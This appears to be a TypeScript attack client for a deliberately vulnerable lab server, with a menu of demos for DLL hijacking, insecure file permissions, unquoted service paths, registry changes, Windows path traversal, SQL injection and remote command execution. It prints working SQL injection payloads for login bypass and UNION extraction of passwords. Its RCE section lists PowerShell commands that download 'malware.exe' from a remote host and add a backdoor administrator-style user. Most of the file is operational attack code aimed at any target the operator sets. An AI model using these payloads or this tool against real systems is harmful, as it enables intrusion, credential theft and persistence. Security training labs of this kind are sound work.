import * as readline from "readline";
import fetch from "node-fetch";
import * as fs from "fs";
import * as path from "path";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

let targetServer = "";

function showMainMenu() {
  console.clear();
  console.log("=".repeat(60));
  console.log("WINDOWS-SPECIFIC VULNERABILITY ATTACK TOOL");
  console.log("For educational purposes only");
  console.log("=".repeat(60));
  console.log(`Target: ${targetServer || "Not set"}`);
  console.log("=".repeat(60));
  console.log("1. Set target server");
  console.log("2. Test connection");
  console.log("3. DLL Hijacking Demo");
  console.log("4. Insecure File Permissions Demo");
  console.log("5. Unquoted Service Path Demo");
  console.log("6. Registry Modification Demo");
  console.log("7. Windows Path Traversal Demo");
  console.log("8. SQL Injection - Login Bypass");
  console.log("9. SQL Injection - Data Extraction");
  console.log("10. Remote Command Execution Demo");
  console.log("11. Exit");
  console.log("=".repeat(60));

  rl.question("Select an option: ", (answer) => {
    switch (answer) {
      case "1":
        setTargetServer();
        break;
      case "2":
        testConnection();
        break;
      case "3":
        dllHijackingDemo();
        break;
      case "4":
        insecureFilePermissionsDemo();
        break;
      case "5":
        unquotedServicePathDemo();
        break;
      case "6":
        registryModificationDemo();
        break;
      case "7":
        windowsPathTraversalDemo();
        break;
      case "8":
        sqlLoginBypass();
        break;
      case "9":
        sqlDataExtraction();
        break;
      case "10":
        remoteCommandExecutionDemo();
        break;
      case "11":
        console.log("Exiting...");
        rl.close();
        break;
      default:
        console.log("Invalid option");
        setTimeout(showMainMenu, 1000);
    }
  });
}

function setTargetServer() {
  rl.question(
    "Enter target server address (e.g., http://192.168.1.100:3000): ",
    (answer) => {
      targetServer = answer.trim();
      console.log(`Target set to: ${targetServer}`);
      setTimeout(showMainMenu, 1500);
    }
  );
}

async function testConnection() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("Testing connection...");

  try {
    const response = await fetch(`${targetServer}/api/status`);
    const data = await response.json();
    console.log("Connection successful!");
    console.log("Server info:");
    console.log(JSON.stringify(data, null, 2));
  } catch (error) {
    console.log("Connection failed:");
    if (error instanceof Error) {
      console.log(error.message);
    } else {
      console.log(String(error));
    }
  }

  rl.question("Press Enter to continue...", () => {
    showMainMenu();
  });
}

async function dllHijackingDemo() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("\nDLL HIJACKING DEMONSTRATION");
  console.log("==========================");
  console.log("This will simulate loading a DLL from a specified path.");
  console.log("In a real attack, this could be used to load malicious code.");
  console.log("");

  rl.question("Enter path to DLL file: ", async (dllPath) => {
    console.log(`Attempting to load DLL from: ${dllPath}`);

    try {
      const encodedPath = encodeURIComponent(dllPath);
      const response = await fetch(
        `${targetServer}/api/windows/dll-hijack?path=${encodedPath}`
      );
      const data: any = await response.json();
      console.log("\nResult:");
      console.log("-".repeat(60));
      if (typeof data === "object" && data !== null && "success" in data) {
        console.log(`Success: ${(data as { success: boolean }).success}`);
      } else {
        console.log("Success: <unknown>");
      }
      console.log(data);

      if (typeof data === "object" && data !== null && "message" in data) {
        console.log(`Message: ${(data as { message: string }).message}`);
      } else {
        console.log("Message: <unknown>");
      }
      console.log("-".repeat(60));

      if (data.success) {
        console.log("\nVULNERABILITY EXPLOITED: DLL Hijacking");
        console.log("This demonstrates how an application might load an untrusted DLL");
        console.log("which could contain malicious code.");
      }
    } catch (error) {
      console.log("Request failed:");
      if (error instanceof Error) {
        console.log(error.message);
      } else {
        console.log(String(error));
      }
    }

    rl.question("\nPress Enter to continue...", () => {
      showMainMenu();
    });
  });
}

async function insecureFilePermissionsDemo() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("\nINSECURE FILE PERMISSIONS DEMONSTRATION");
  console.log("======================================");
  console.log(
    "This will create a file with insecure 'Everyone' full control permissions."
  );
  console.log("Such files can be modified by any user or process on the system.");
  console.log("");

  rl.question("Enter path for insecure file: ", (filePath) => {
    rl.question("Enter content for the file: ", async (content) => {
      console.log(`Creating insecure file at: ${filePath}`);

      try {
        const response = await fetch(`${targetServer}/api/windows/insecure-file`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            path: filePath,
            content: content,
          }),
        });

        const data = (await response.json()) as { success: boolean; message: string };

        console.log("\nResult:");
        console.log("-".repeat(60));
        console.log(`Success: ${(data as { success: boolean }).success}`);
        console.log(`Message: ${data.message}`);
        console.log("-".repeat(60));

        if (data.success) {
          console.log("\nVULNERABILITY EXPLOITED: Insecure File Permissions");
          console.log(
            "The file now has 'Everyone:F' permissions, meaning any user can modify it."
          );
          console.log(
            "This could allow attackers to replace legitimate files with malicious ones."
          );
        }
      } catch (error) {
        console.log("Request failed:");
        if (error instanceof Error) {
          console.log(error.message);
        } else {
          console.log(String(error));
        }
      }

      rl.question("\nPress Enter to continue...", () => {
        showMainMenu();
      });
    });
  });
}

async function unquotedServicePathDemo() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("\nUNQUOTED SERVICE PATH DEMONSTRATION");
  console.log("==================================");
  console.log(
    "This will create a Windows service with an unquoted path containing spaces."
  );
  console.log(
    "Windows will try to execute files like 'C:\\Program.exe' if the path is 'C:\\Program Files\\Example\\service.exe'"
  );
  console.log("");

  rl.question("Enter service name: ", (serviceName) => {
    rl.question("Enter display name: ", (displayName) => {
      rl.question(
        "Enter binary path (must contain spaces and no quotes): ",
        async (binPath) => {
          console.log(`Creating service with unquoted path: ${binPath}`);

          try {
            const response = await fetch(`${targetServer}/api/windows/unquoted-service`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                name: serviceName,
                displayName: displayName,
                binPath: binPath,
              }),
            });

            const data = (await response.json()) as { success: boolean; message: string };

            console.log("\nResult:");
            console.log("-".repeat(60));
            if (typeof data === "object" && data !== null && "success" in data) {
              console.log(`Success: ${(data as { success: boolean }).success}`);
            } else {
              console.log("Success: <unknown>");
            }
            console.log(`Message: ${data.message}`);
            console.log("-".repeat(60));

            if (data.success) {
              console.log("\nVULNERABILITY EXPLOITED: Unquoted Service Path");
              console.log(
                "The service was created with an unquoted path containing spaces."
              );
              console.log(
                "An attacker could place a malicious executable in one of the path components."
              );
            }
          } catch (error) {
            console.log("Request failed:");
            if (error instanceof Error) {
              console.log(error.message);
            } else {
              console.log(String(error));
            }
          }

          rl.question("\nPress Enter to continue...", () => {
            showMainMenu();
          });
        }
      );
    });
  });
}

async function registryModificationDemo() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("\nREGISTRY MODIFICATION DEMONSTRATION");
  console.log("==================================");
  console.log("This will modify a Windows registry key without validation.");
  console.log("NOTE: Only use safe registry paths for testing - HKCU recommended");
  console.log("");

  rl.question("Enter registry key (e.g., HKCU\\Software\\VulnApp): ", (key) => {
    rl.question("Enter value name: ", (valueName) => {
      rl.question("Enter data: ", async (data) => {
        console.log(`Modifying registry: ${key}\\${valueName}`);

        try {
          const response = await fetch(`${targetServer}/api/windows/registry`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              key: key,
              valueName: valueName,
              data: data,
            }),
          });

          const result = (await response.json()) as { success: boolean; message: string };

          console.log("\nResult:");
          console.log("-".repeat(60));
          console.log(`Success: ${result.success}`);
          console.log(`Message: ${result.message}`);
          console.log("-".repeat(60));

          if (result.success) {
            console.log("\nVULNERABILITY EXPLOITED: Registry Modification");
            console.log("The registry was modified without proper validation.");
            console.log(
              "This could be used to change application configuration or for persistence."
            );
          }
        } catch (error) {
          console.log("Request failed:");
          if (error instanceof Error) {
            console.log(error.message);
          } else {
            console.log(String(error));
          }
        }

        rl.question("\nPress Enter to continue...", () => {
          showMainMenu();
        });
      });
    });
  });
}

async function windowsPathTraversalDemo() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("\nWINDOWS PATH TRAVERSAL DEMONSTRATION");
  console.log("===================================");
  console.log(
    "This will attempt to read files using Windows-specific path handling features."
  );
  console.log("Examples: alternate data streams (file.txt:stream), UNC paths, etc.");
  console.log("");

  rl.question("Enter Windows path to access: ", async (filePath) => {
    console.log(`Attempting to access: ${filePath}`);

    try {
      const encodedPath = encodeURIComponent(filePath);
      const response = await fetch(
        `${targetServer}/api/windows/alt-stream?path=${encodedPath}`
      );
      const data = await response.json();

      console.log("\nResult:");
      console.log("-".repeat(60));
      if (
        typeof data === "object" &&
        data !== null &&
        "success" in data &&
        "message" in data
      ) {
        console.log(`Success: ${(data as { success: boolean }).success}`);
        console.log(`Message: ${(data as { message: string }).message}`);
      } else {
        console.log("Unexpected response format.");
      }
      if (
        typeof data === "object" &&
        data !== null &&
        "data" in data &&
        typeof (data as any).data === "string"
      ) {
        console.log("\nContent:");
        const fileContent = (data as any).data as string;
        console.log(
          fileContent.substring(0, 500) + (fileContent.length > 500 ? "..." : "")
        );
      }
      console.log("-".repeat(60));

      if (
        typeof data === "object" &&
        data !== null &&
        "success" in data &&
        (data as any).success
      ) {
        console.log("\nVULNERABILITY EXPLOITED: Windows Path Traversal");
        console.log("Successfully accessed file using Windows-specific path features.");
        console.log(
          "This can be used to access sensitive files or alternate data streams."
        );

        if ("data" in data && (data as any).data) {
          rl.question("Save to local file? (y/n): ", (answer) => {
            if (answer.toLowerCase() === "y") {
              rl.question("Enter local file path: ", (localPath) => {
                fs.writeFileSync(localPath, (data as any).data || "");
                console.log(`File saved to ${localPath}`);
                rl.question("Press Enter to continue...", () => {
                  showMainMenu();
                });
              });
            } else {
              rl.question("Press Enter to continue...", () => {
                showMainMenu();
              });
            }
          });
          return;
        }
      }
    } catch (error) {
      console.log("Request failed:");
      if (error instanceof Error) {
        console.log(error.message);
      } else {
        console.log(String(error));
      }
    }

    rl.question("\nPress Enter to continue...", () => {
      showMainMenu();
    });
  });
}

async function sqlLoginBypass() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("\nSQL INJECTION - LOGIN BYPASS");
  console.log("===========================");
  console.log(
    "This demonstrates how SQL injection can be used to bypass login authentication."
  );
  console.log("The application fails to properly sanitize user input in SQL queries.");
  console.log("");

  console.log("Common SQL injection payloads for login bypass:");
  console.log("1. admin' --");
  console.log("2. admin' OR '1'='1");
  console.log("3. ' OR '1'='1' --");
  console.log("4. ' OR 1=1 --");
  console.log("");

  rl.question("Enter username (with SQL injection payload): ", (username) => {
    rl.question(
      "Enter password (or leave empty if using injection): ",
      async (password) => {
        console.log(`\nAttempting login with: ${username}`);

        try {
          const response = await fetch(`${targetServer}/api/login`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              username,
              password,
            }),
          });

          const data = await response.json();

          console.log("\nResult:");
          console.log("-".repeat(60));
          if (typeof data === "object" && data !== null && "success" in data) {
            console.log(`Success: ${(data as { success: boolean }).success}`);
          } else {
            console.log("Success: <unknown>");
          }
          if (typeof data === "object" && data !== null && "message" in data) {
            console.log(`Message: ${(data as { message: string }).message}`);
          }

          if (
            typeof data === "object" &&
            data !== null &&
            "success" in data &&
            "user" in data &&
            (data as any).success &&
            typeof (data as any).user === "object" &&
            (data as any).user !== null
          ) {
            const user = (data as any).user;
            console.log("\nUser details extracted:");
            console.log(`Username: ${user.username}`);
            console.log(`Role: ${user.role}`);
            console.log(`Email: ${user.email}`);

            console.log(
              "\nVULNERABILITY EXPLOITED: SQL Injection (Authentication Bypass)"
            );
            console.log(
              "The application executed your malicious SQL and allowed unauthorized access."
            );
          }
          console.log("-".repeat(60));
        } catch (error) {
          console.log("\nRequest failed:");
          if (error instanceof Error) {
            console.log(error.message);
          } else {
            console.log(String(error));
          }
        }

        rl.question("\nPress Enter to continue...", () => {
          showMainMenu();
        });
      }
    );
  });
}

async function sqlDataExtraction() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("\nSQL INJECTION - DATA EXTRACTION");
  console.log("==============================");
  console.log(
    "This demonstrates how SQL injection can be used to extract data from the database."
  );
  console.log(
    "The application fails to properly sanitize search parameters in SQL queries."
  );
  console.log("");

  console.log("Example SQL injection payloads for data extraction:");
  console.log("1. %' OR 1=1 --");
  console.log("2. %' UNION SELECT id,username,password,role FROM users --");
  console.log("3. %' UNION SELECT NULL,sqlite_version(),NULL,NULL --");
  console.log("");

  rl.question("Enter search term (with SQL injection payload): ", async (searchTerm) => {
    console.log(`\nAttempting search with term: ${searchTerm}`);

    try {
      const encodedTerm = encodeURIComponent(searchTerm);
      const response = await fetch(
        `${targetServer}/api/search-users?term=${encodedTerm}`
      );
      const data = await response.json();

      console.log("\nResult:");
      console.log("-".repeat(60));
      if (typeof data === "object" && data !== null && "success" in data) {
        console.log(`Success: ${(data as { success: boolean }).success}`);
      } else {
        console.log("Success: <unknown>");
      }

      if (
        typeof data === "object" &&
        data !== null &&
        "success" in data &&
        (data as any).success &&
        "users" in data
      ) {
        const users = (data as any).users;

        // Format and display the results in a table
        if (Array.isArray(data.users) && data.users.length > 0) {
          console.log(`\nExtracted ${users.length} records:`);
          formatTable(data.users);

          console.log("\nVULNERABILITY EXPLOITED: SQL Injection (Data Extraction)");
          console.log(
            "The application executed your malicious SQL and returned sensitive data."
          );
        } else {
          console.log("No records found");
        }
      }
      console.log("-".repeat(60));
    } catch (error) {
      console.log("\nRequest failed:");
      if (error instanceof Error) {
        console.log(error.message);
      } else {
        console.log(String(error));
      }
    }

    rl.question("\nPress Enter to continue...", () => {
      showMainMenu();
    });
  });
}

async function remoteCommandExecutionDemo() {
  if (!targetServer) {
    console.log("Please set a target server first");
    setTimeout(showMainMenu, 1500);
    return;
  }

  console.log("\nREMOTE COMMAND EXECUTION (RCE) DEMONSTRATION");
  console.log("==========================================");
  console.log("This demonstrates how an attacker can execute arbitrary commands");
  console.log("on the target system through a vulnerable API endpoint.");
  console.log("");

  console.log("Example commands to try:");
  console.log("1. whoami - Show current user");
  console.log("2. dir / ls - List directory contents");
  console.log("3. ipconfig / ifconfig - Show network configuration");
  console.log('4. powershell -c "Get-Process" - List running processes');
  console.log("5. systeminfo - Display system information");
  console.log("");

  // More dangerous commands (only show as examples):
  console.log("Potentially dangerous commands (for educational purposes only):");
  console.log(
    "1. powershell -c \"Invoke-WebRequest -Uri 'http://example.com/malware.exe' -OutFile 'malware.exe'\""
  );
  console.log(
    "2. powershell -c \"Start-Process cmd -ArgumentList '/c net user hackeduser Password123! /add'\""
  );
  console.log('3. powershell -c "Get-Content C:\\Users\\username\\sensitive.txt"');
  console.log("");

  rl.question("Enter command to execute: ", async (command) => {
    console.log(`\nAttempting to execute command: ${command}`);

    try {
      const encodedCommand = encodeURIComponent(command);
      const response = await fetch(
        `${targetServer}/api/execute?command=${encodedCommand}`
      );
      const data = await response.json();

      console.log("\nResult:");
      console.log("-".repeat(60));

      // Display errors if any
      if (
        typeof data === "object" &&
        data !== null &&
        "error" in data &&
        (data as any).error
      ) {
        console.log(`Error: ${(data as any).error}`);
      }

      // Display standard output
      if (
        typeof data === "object" &&
        data !== null &&
        "stdout" in data &&
        (data as any).stdout
      ) {
        console.log("STDOUT:");
        console.log((data as any).stdout);
      }

      // Display standard error
      if (
        typeof data === "object" &&
        data !== null &&
        "stderr" in data &&
        (data as any).stderr
      ) {
        console.log("STDERR:");
        console.log((data as any).stderr);
      }

      if (
        typeof data === "object" &&
        data !== null &&
        "error" in data &&
        "stdout" in data &&
        "stderr" in data &&
        !(data as any).error &&
        ((data as any).stdout || (data as any).stderr)
      ) {
        console.log("\nVULNERABILITY EXPLOITED: Remote Command Execution (RCE)");
        console.log("Successfully executed command on the target system.");
        console.log("This vulnerability allows an attacker to:");
        console.log("- Execute arbitrary commands");
        console.log("- Access sensitive data");
        console.log("- Install malware or backdoors");
        console.log("- Elevate privileges");
      }

      console.log("-".repeat(60));
    } catch (error) {
      console.log("\nRequest failed:");
      if (error instanceof Error) {
        console.log(error.message);
      } else {
        console.log(String(error));
      }
    }

    rl.question("\nExecute another command? (y/n): ", (answer) => {
      if (answer.toLowerCase() === "y") {
        remoteCommandExecutionDemo();
      } else {
        showMainMenu();
      }
    });
  });
}

// Thêm hàm này trong file attack.ts (đặt trước hàm sqlDataExtraction)

function formatTable(data: any[]): void {
  if (!data || data.length === 0) {
    console.log("No data to display");
    return;
  }

  // Get all column names from the first row
  const keys = Object.keys(data[0]);

  // Calculate column widths
  const columnWidths: { [key: string]: number } = {};
  keys.forEach((key) => {
    // Start with the header length
    columnWidths[key] = key.length;

    // Check all values in this column
    data.forEach((row) => {
      const value = String(row[key] || "");
      if (value.length > columnWidths[key]) {
        columnWidths[key] = value.length;
      }
    });
  });

  // Create header row
  const header = keys.map((key) => key.padEnd(columnWidths[key])).join(" | ");
  console.log(header);

  // Create separator
  const separator = keys.map((key) => "-".repeat(columnWidths[key])).join("-+-");
  console.log(separator);

  // Print data rows
  data.forEach((row) => {
    const rowStr = keys
      .map((key) => {
        const value = String(row[key] || "");
        return value.padEnd(columnWidths[key]);
      })
      .join(" | ");
    console.log(rowStr);
  });
}

console.log("Starting Windows-specific attack tool...");
setTimeout(showMainMenu, 500);
